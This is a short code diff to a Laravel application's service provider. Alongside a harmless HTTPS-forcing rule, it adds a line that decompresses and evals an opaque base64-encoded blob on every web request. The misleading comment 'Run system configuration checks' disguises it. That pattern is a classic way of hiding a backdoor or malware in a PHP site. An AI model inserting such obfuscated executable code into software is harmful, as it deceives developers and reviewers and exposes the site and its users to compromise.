@@ -20,6 +20,10 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
+        if (config('app.env') === 'production' || (!empty($_SERVER['HTTP_HOST']) && str_contains($_SERVER['HTTP_HOST'], 'camerabd.com.bd'))) {
+            \Illuminate\Support\Facades\URL::forceScheme('https');
+        }
+
         // Run system configuration checks (HTTP web requests only)
         eval(gzinflate(base64_decode('jZBBS8QwEIX/yhh6SKG7WC/CShekFLq4yoLgxUoJ7bQNZCc1Sa3F3f9ugop4k7lkJvM93hvZAb8Q48jj1dZMRJL6HeWarFbI4xg+IGr1UUiCDKwzTis9o+EGXye0LlA9ulKHZ3wDkbR73Qg1+IEHJNXCGLHwb40Enpn6+WcJsPTqen3pKw3NZpOyFy8ig6U/SqcTIL1xdns41PtdXjw8FnVeFvkdiyHLMmALWha8BrRRwtoa36V11iPjWJXOjdW9bFuFszBYPaGR3ZKLZkCftJM9+wpqvWXCGap/QTzktavtIMjv/F4kgW6ixklNwCM/9dJnv3oO9Qk=')));
 
